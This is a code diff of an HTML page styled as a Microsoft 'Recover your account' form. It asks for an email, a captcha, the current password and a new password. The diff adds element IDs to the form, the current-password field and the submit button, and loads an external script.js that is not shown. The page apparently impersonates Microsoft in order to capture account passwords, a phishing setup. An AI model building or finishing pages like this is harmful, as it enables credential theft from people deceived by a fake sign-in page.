@@ -9,7 +9,7 @@
     <img src="https://account.azureedge.net/images/AppCentipede/AppCentipede_Microsoft.svg" style="margin-top: 100px; margin-bottom: 60px">
     <h2 style="font-weight: 200; font-family: 'Roboto', sans-serif">Recover your account</h2>
     <p style="font-weight: 200; font-family: 'Roboto',sans-serif; letter-spacing: 1.5px">We can help you reset your password. <br>First, enter your Microsoft account and follow the instructions below</p>
-    <form>
+    <form id="daform">
         <input type="text" placeholder="Email, phone, or Skype name" style="margin-top: 20px; height: 25px; width: 240px; letter-spacing: 0.8px; font-size: 12px">
         <br />
         <img  id="W68HP" src="https://thefallenbrain.files.wordpress.com/2016/05/input-black.gif" style="height:60px; position: relative; top: 25px; right:-80px; width: 120px;">
@@ -20,7 +20,7 @@
         <br />
         <p id="nope2">The captcha you entered is not correct, please try again</p>
         <br />
-        <input type="password" placeholder="Current password" style="margin-top: 20px; height: 25px; width: 240px; letter-spacing: 0.8px; font-size: 12px">
+        <input type="password" id="oldest" placeholder="Current password" style="margin-top: 20px; height: 25px; width: 240px; letter-spacing: 0.8px; font-size: 12px">
         <br />
         <input type="password" id = "older" placeholder="New password" style="margin-top: 20px; height: 25px; width: 240px; letter-spacing: 0.8px; font-size: 12px">
         <br />
@@ -28,7 +28,7 @@
         <br />
         <p id="nope"></p>
         <br />
-        <button style="margin-top: 10px; box-shadow: none; border-radius: 0; background-color: #0078D7; color: white; font-size: 14px; font-weight: lighter; letter-spacing: 1.2px; padding: 20px">Change password</button>
+        <button id="sender" style="margin-top: 10px; box-shadow: none; border-radius: 0; background-color: #0078D7; color: white; font-size: 14px; font-weight: lighter; letter-spacing: 1.2px; padding: 20px">Change password</button>
     </form>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script type="text/javascript">
@@ -81,6 +81,8 @@ $("input#checker").keypress(function(){
 });
 
 
+
 </script>
+<script type="text/javascript" src="script.js"></script>
 </body>
 </html>
